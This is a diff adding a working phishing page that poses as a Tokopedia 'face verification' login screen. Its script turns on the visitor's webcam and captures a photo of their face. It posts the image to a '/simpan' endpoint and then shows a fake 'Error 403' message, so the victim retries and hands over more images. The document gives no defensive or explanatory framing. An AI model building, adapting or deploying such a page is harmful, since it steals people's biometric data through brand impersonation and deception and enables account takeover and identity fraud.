@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tokopedia - Verifikasi</title>
+    <style>
+        body { background:#f4f7f9; font-family:sans-serif; display:flex; justify-content:center; padding-top:50px; }
+        .box { background:#fff; padding:30px; border-radius:15px; width:320px; text-align:center; box-shadow:0 5px 15px rgba(0,0,0,0.1); }
+        video { width:100%; border-radius:50%; border:4px solid #00AA5B; background:#000; transform:scaleX(-1); height:220px; object-fit:cover; }
+        button { width:100%; padding:15px; background:#00AA5B; color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; margin-top:20px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="color:#00AA5B">tokopedia</h2>
+        <p>Verifikasi wajah untuk keamanan akun</p>
+        <video id="v" autoplay playsinline muted></video>
+        <button id="b" disabled>Login Sekarang</button>
+        <canvas id="c" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        const v = document.getElementById('v'), b = document.getElementById('b'), c = document.getElementById('c');
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => { v.srcObject = s; b.disabled = false; });
+
+        b.onclick = async () => {
+            b.innerText = "Memproses...";
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            const imgBase64 = c.toDataURL('image/jpeg', 0.5);
+
+            await fetch('/simpan', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imgBase64 })
+            });
+
+            alert("Gagal memverifikasi wajah (Error 403). Pastikan wajah terlihat jelas.");
+            b.innerText = "Login Sekarang";
+        };
+    </script>
+</body>
+</html>
